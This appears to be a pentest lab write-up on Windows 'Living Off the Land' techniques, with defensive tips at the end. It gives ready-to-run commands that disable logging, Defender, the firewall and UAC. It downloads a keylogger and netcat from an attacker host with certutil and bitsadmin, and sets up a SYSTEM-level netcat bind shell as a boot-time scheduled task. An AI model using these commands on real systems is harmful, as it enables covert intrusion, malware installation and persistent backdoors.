# Living Off the Land (LOLBins) — Windows Penetration Testing

**Date:** February 26th, 2026

**Platform:** Linux (Kali) → Windows Target

**Difficulty:** Intermediate

---

## Overview

This lab focused on **Living Off the Land (LOLBin)** techniques — a core concept in modern offensive security where attackers use legitimate, pre-installed Windows binaries to carry out malicious activities without introducing external tools that might trigger antivirus or EDR solutions.

The lab simulated a realistic attack chain from initial access through persistence establishment.

---

## Environment

| Component | Details |
|---|---|
| Attacker Machine | Kali Linux |
| Target Machine | Windows Server (MS) |
| Target IP | `[TARGET_IP]` |
| Remote Access Method | sshuttle relay + psexec.py + Evil-WinRM |
| Shell Types | CMD (psexec) and PowerShell (Evil-WinRM) |

---

## Attack Chain Summary

### Phase 1: Establishing Remote Access

Used three tools in combination to establish dual remote shells into the target:

- **sshuttle** — created a VPN-like tunnel between Kali and the target network, acting as a relay for all subsequent traffic
- **psexec.py** (Impacket) — authenticated to the target and spawned a remote `cmd.exe` shell (`__PSEXEC__` window)
- **Evil-WinRM** — leveraged Windows Remote Management (WinRM), a legitimate built-in Windows feature, to establish a full PowerShell session (`__EVILWINRM__` window)

**Key takeaway:** Having both a CMD and PowerShell shell provides flexibility — some LOLBins work better in one environment vs the other.

---

### Phase 2: Defense Evasion — Disabling Windows Security

**MITRE ATT&CK:** T1562 — Impair Defenses

Before performing any further actions, disabled all major Windows security features to minimize detection and logging:

**Disabled audit logging:**
```powershell
auditpol /set /category:* /success:disable /failure:disable
```

**Disabled Microsoft Defender real-time and behavior monitoring:**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true
```

**Disabled Windows Firewall across all profiles:**
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

**Disabled UAC via registry modification:**
```powershell
Set-ItemProperty -Path "REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
```

**Key takeaway:** Disabling security controls early in an engagement demonstrates to clients how silently an attacker can operate once initial access is achieved. Each of these is a legitimate Windows administration command — exactly what makes LOLBins dangerous.

---

### Phase 3: Script Creation and Transfer

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer

Demonstrated how an attacker can host malicious scripts on a web server and use built-in Windows tools to pull them down:

1. Started Apache2 on Kali as a staging server
2. Created a PowerShell script (`date.ps1`) in the Apache webroot
3. Used **Invoke-WebRequest** (LOLBin) to download the script to the target:

```powershell
Invoke-WebRequest -Uri "http://[KALI_IP]/date.ps1" -OutFile "C:\HR\date.ps1"
```

4. Executed the transferred script on the target

**Key takeaway:** `Invoke-WebRequest` is a trusted PowerShell cmdlet. Using it to pull down scripts bypasses many basic AV solutions because the transfer itself looks like normal web traffic.

---

### Phase 4: File Ownership and ACL Manipulation

**MITRE ATT&CK:** T1222 — File and Directory Permissions Modification

Demonstrated how an attacker can take ownership of files and modify access controls:

**Took ownership of target file:**
```cmd
takeown /f C:\HR\EMPLOYEES.csv
```

**Viewed existing ACLs:**
```cmd
icacls C:\HR\EMPLOYEES.csv
```

**Added a DENY rule for Everyone:**
```cmd
icacls "C:\HR\EMPLOYEES.csv" /deny "Everyone:(F)"
```

**Key takeaway:** Both `takeown` and `icacls` are legitimate Windows administration tools. An attacker could use these to lock legitimate users out of their own files or to hide evidence by restricting who can read logs or audit trails.

---

### Phase 5: Tool Transfer Using LOLBins

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer

When local LOLBin capabilities are insufficient, attackers can use trusted Windows tools to pull in additional hacking tools from external sources:

**Used certutil to download klogger:**
```cmd
certutil -urlcache -split -f http://[KALI_IP]/klogger.exe C:\HR\klogger.exe
```

**Used bitsadmin to download nc.exe:**
```cmd
bitsadmin /transfer mydownloadjob /download /priority normal http://[KALI_IP]/nc.exe C:\HR\nc.exe
```

**Key takeaway:** `certutil` is normally used for certificate management. `bitsadmin` is normally used by Windows Update. Both are completely trusted by Windows — making them ideal for covert file transfers.

---

### Phase 6: Persistence via Scheduled Task and Bind Shell

**MITRE ATT&CK:** T1053.005 — Scheduled Task | T1059.003 — Windows Command Shell

The final phase demonstrated establishing **persistence** — ensuring access survives a system reboot:

**Created a batch file to launch a Netcat bind shell listener:**
```cmd
echo c:\HR\nc.exe -Lp 8080 -e c:\windows\system32\cmd.exe > C:\HR\remote.bat
```

**Created a scheduled task to run the batch file at every system boot:**
```cmd
schtasks /create /tn RaB /tr C:\HR\remote.bat /sc onstart /ru SYSTEM /rl highest /f
```

**Forced a reboot to test persistence:**
```cmd
shutdown /r /t 0
```

**After reboot, connected back via Netcat from Kali:**
```bash
nc [TARGET_IP] 8080
```
## Flag Reference

| Flag | Meaning |
|------|---------|
| `/tn RaB` | Task name = RaB |
| `/tr C:\HR\remote.bat` | Task to run = remote.bat |
| `/sc onstart` | Schedule = on system boot |
| `/ru SYSTEM` | Run as SYSTEM (highest privilege account) |
| `/rl highest` | Highest run level |
| `/f` | Force create, no confirmation prompt |

## Summary Table

| Step | Where | Command |
|------|-------|---------|
| Create batch file | PSEXEC | `echo c:\HR\nc.exe -Lp 8080 -e c:\windows\system32\cmd.exe > C:\HR\remote.bat` |
| Verify batch file | PSEXEC | `type C:\HR\remote.bat` |
| Create scheduled task | PSEXEC | `schtasks /create /tn RaB /tr C:\HR\remote.bat /sc onstart /ru SYSTEM /rl highest /f` |
| Verify task | PSEXEC | `schtasks /query /tn RaB` |
| Reboot target | PSEXEC | `shutdown /r /t 0` |
| Connect back in | Kali terminal | `nc [TARGET_IP] 8080` |

**Key takeaway:** Scheduled tasks are a native Windows feature used by legitimate software constantly. Hiding a backdoor inside a scheduled task means it survives reboots and looks like normal system behavior to a casual observer.


---

## Tools & LOLBins Used

| Tool | Type | Legitimate Use | Malicious Use |
|---|---|---|---|
| `auditpol` | LOLBin | Manage audit policies | Disable all logging |
| `Set-MpPreference` | LOLBin | Configure Defender | Disable AV monitoring |
| `Set-NetFirewallProfile` | LOLBin | Manage firewall | Disable firewall entirely |
| `Set-ItemProperty` | LOLBin | Edit registry | Disable UAC |
| `Invoke-WebRequest` | LOLBin | Download files | Pull down malicious scripts |
| `certutil` | LOLBin | Manage certificates | Download malicious executables |
| `bitsadmin` | LOLBin | Background file transfer | Covertly download tools |
| `takeown` | LOLBin | Recover file ownership | Steal ownership of sensitive files |
| `icacls` | LOLBin | Manage file permissions | Lock out legitimate users |
| `schtasks` | LOLBin | Schedule legitimate tasks | Establish persistent backdoor |
| `nc.exe` (Netcat) | External tool | Network testing | Bind shell backdoor |

---

## Key Lessons Learned

**Defense Evasion is the first priority.** Before doing anything noisy, an attacker disables logging and monitoring. This makes all subsequent activity much harder to detect or reconstruct forensically.

**LOLBins are powerful because they're trusted.** Every tool used in this lab is built into Windows or is a standard admin tool. Defending against LOLBins requires behavioral analysis, not just signature-based detection.

**Persistence is the endgame.** Getting initial access is only half the battle. A scheduled task bind shell means access survives reboots, user logoffs, and even some incident response activities.

**Dual shells provide flexibility.** CMD and PowerShell have different syntax rules and capabilities. Maintaining both gives an attacker options when one method fails.

---

## Defensive Recommendations

- Enable and monitor **Windows Event Logging** — specifically audit policy changes, scheduled task creation, and PowerShell activity
- Deploy **application whitelisting** to restrict which binaries can execute and in what context
- Monitor for **unusual use of trusted binaries** — certutil downloading `.exe` files is a red flag
- Implement **Privileged Access Workstations (PAW)** to limit who can modify registry keys and firewall settings
- Alert on **outbound connections from cmd.exe or nc.exe** on non-standard ports like 8080

---

## References

- [MITRE ATT&CK — Defense Evasion T1562](https://attack.mitre.org/tactics/TA0005/)
- [MITRE ATT&CK — Ingress Tool Transfer T1105](https://attack.mitre.org/techniques/T1105/)
- [MITRE ATT&CK — Scheduled Task T1053.005](https://attack.mitre.org/techniques/T1053/005/)
- [LOLBAS Project](https://lolbas-project.github.io/) — comprehensive database of LOLBins

## Tags
`LOLBins` `Persistence` `Defense Evasion` `MITRE ATT&CK` `PowerShell` `Pentesting`
